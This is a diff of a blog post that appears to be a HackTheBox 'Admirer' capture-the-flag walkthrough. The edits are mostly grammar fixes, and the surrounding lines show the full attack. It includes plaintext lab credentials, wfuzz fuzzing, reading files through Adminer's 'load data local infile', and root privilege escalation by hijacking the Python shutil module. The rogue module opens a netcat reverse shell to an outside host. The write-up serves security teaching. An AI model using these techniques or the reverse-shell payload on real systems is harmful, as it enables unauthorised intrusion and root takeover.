@@ -133,13 +133,13 @@ w0rdpr3ss01!
 </code></pre>
 <p>Great, a lot of plain text passwords. Using the FTP account:</p>
 <p><img src="/images/posts/htb_admirer_1.png" alt="alt text" title="inside FTP"></p>
-<p>Inside there are a <em>dump.sql</em> and <em>html.tar.gz</em> appears to be backups files.</p>
+<p>Inside there are a <em>dump.sql</em> and <em>html.tar.gz</em> seems to be backups files.</p>
 <p>Looking inside <em>db_admin.php</em>:</p>
 <pre><code>$username = &quot;waldo&quot;;
 $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;
 </code></pre>
 <p>Sadly not working via ssh&hellip;</p>
-<p>Also in the backup there is a file called, <em>admin_tasks.php</em>, open to internet:</p>
+<p>Also, in the backup there is a file called, <em>admin_tasks.php</em>, open to internet:</p>
 <pre><code>&lt;html&gt;                                                                                                                                                                             
 &lt;head&gt;                  
   &lt;title&gt;Administrative Tasks&lt;/title&gt;                                                         
@@ -194,9 +194,9 @@ NOTE: Options 4-7 are currently NOT working because they need root privileges.
 &lt;/html&gt;
 </code></pre>
 <p><img src="/images/posts/htb_admirer_2.png" alt="alt text" title="Admin tasks Admirer"></p>
-<p>Obviously this file catched my attention because appears to do administrative things and really juicy tasks like backing the passwd and shadow files&hellip;</p>
-<p>I wasted time here trying to exploit the tool without luck so i supposed was a rabbit hole.</p>
-<p>Trying to fuzz again the path of the tool <em>administrative_tasks.php</em> looking for similar files, because i got a backup of the site maybe the admin is using the path for an upgraded tool or similar scripts:</p>
+<p>Obviously this file catched my attention because apparently it does administrative things and really juicy tasks like backing the passwd and shadow files&hellip;</p>
+<p>I wasted time here trying to exploit the tool without luck so I supposed it was a rabbit hole.</p>
+<p>Trying to fuzz again the path of the tool <em>administrative_tasks.php</em> looking for similar files, because I got a backup of the site maybe the admin is using the path for an upgraded tool or similar scripts:</p>
 <pre><code>wfuzz -c -w /usr/share/wordlists/dirb/big.txt -z list,php-txt-html --hc 403,404 -t 100 -u http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -281,11 +281,11 @@ Bye
 <p>Worked, inside Adminer the panel, the SQL Command editor</p>
 <p><img src="/images/posts/htb_admirer_4.png" alt="alt text" title="Adminer panel HTB"></p>
 <p>Next step is dumping the file <em>index.php</em>.</p>
-<p><em>Why index.php?</em> because i know there are credentials inside looking the old web backup i found on the FTP. The old credentials did not work so maybe the credentials changed.</p>
+<p><em>Why index.php?</em> because I know there are credentials inside looking the old web backup I found on the FTP. The old credentials did not work so maybe the credentials changed.</p>
 <pre><code>load data local infile ‘/var/www/html/index.php’ into table dummy;
 </code></pre>
 <p><img src="/images/posts/htb_admirer_5.png" alt="alt text" title="dumping data to my local database"></p>
-<p>Worked, as i figured out before there are credentials inside and are different to the old ones.</p>
+<p>Worked, as I figured out before there are credentials inside and are different to the old ones.</p>
 <p><img src="/images/posts/htb_admirer_6.png" alt="alt text" title="Dumped data"></p>
 <pre><code>$username = &quot;waldo&quot;; 
 $password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;
@@ -305,7 +305,7 @@ Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 You have new mail.
 </code></pre>
-<p>Great, i am in and i got a low privileged account.</p>
+<p>Great, I am in and I got a low privileged account.</p>
 <pre><code>waldo@admirer:~$ ls
 user.txt
 waldo@admirer:~$ cat user.txt 
@@ -419,7 +419,7 @@ select opt in &quot;${options[@]}&quot;; do
     esac
 doneexit 0
 </code></pre>
-<p>After a while, i found interesting the function:</p>
+<p>After a while, I found interesting the function:</p>
 <pre><code>backup_web()
 {
     if [ &quot;$EUID&quot; -eq 0 ]
@@ -428,7 +428,7 @@ doneexit 0
     /opt/scripts/backup.py &amp;
 [...]
 </code></pre>
-<p>So this script call the python script backup.py and waldo has sudo permissions on the .sh file, so finally the python script is executed with root permissions:</p>
+<p>So this script call the python script backup.py and waldo has sudo permissions on the .sh file and finally the python script is executed with root permissions:</p>
 <p>Checking backup.py</p>
 <pre><code>waldo@admirer:/opt/scripts$ cat backup.py 
 
@@ -445,7 +445,7 @@ dst = '/var/backups/html'
 
 make_archive(dst, 'gztar', src)
 </code></pre>
-<p>After studying both files i put the effort on the library called &ldquo;shutil&rdquo;, because the python and bash scripts can not be modified.</p>
+<p>After studying both files I put the effort on the library called &ldquo;shutil&rdquo;, because the python and bash scripts can not be modified.</p>
 <p>checking the PYTHONPATH:</p>
 <pre><code>waldo@admirer:/opt/scripts$ python -c 'import sys; print &quot;\n&quot;.join(sys.path)'
 
@@ -458,7 +458,7 @@ make_archive(dst, 'gztar', src)
 /usr/lib/python2.7/dist-packages
 </code></pre>
 <p>So the strategy is library/path hijacking.</p>
-<p>To do that, modifying the PYTHONPATH to use a <em>rogue</em> library forcing to use the library <em>shutil</em> with a custom script instead the original library on a different path.</p>
+<p>To do that we have to modify the PYTHONPATH to use a <em>rogue</em> library forcing to use the library <em>shutil</em> with a custom script instead the original library on a different path.</p>
 <h3 id="creating-the-path-lib-inside-homewaldolib">Creating the path lib inside /home/waldo/lib</h3>
 <pre><code>waldo@admirer:~$ mkdir lib
 waldo@admirer:~$ cd lib/
@@ -466,7 +466,7 @@ waldo@admirer:~/lib$ nano shutil.py
 waldo@admirer:~/lib$ sudo PYTHONPATH=/home/waldo/lib /opt/scripts/admin_tasks.sh
 </code></pre>
 <h3 id="custom-shutilpy">Custom shutil.py</h3>
-<p>Just a simple python script to make a reverse connection with netcat. So when the function backup_web() is fired the python script will be executed as root and will open a reverse connection to our machine.</p>
+<p>Just a simple python script to make a reverse connection with netcat. When the function backup_web() is fired, the python script will be executed as root and will open a reverse connection to our machine.</p>
 <pre><code>waldo@admirer:~/lib$ cat shutil.py
 import os
 os.system(&quot;nc 10.10.14.11 1234 -e '/bin/sh'&quot;)
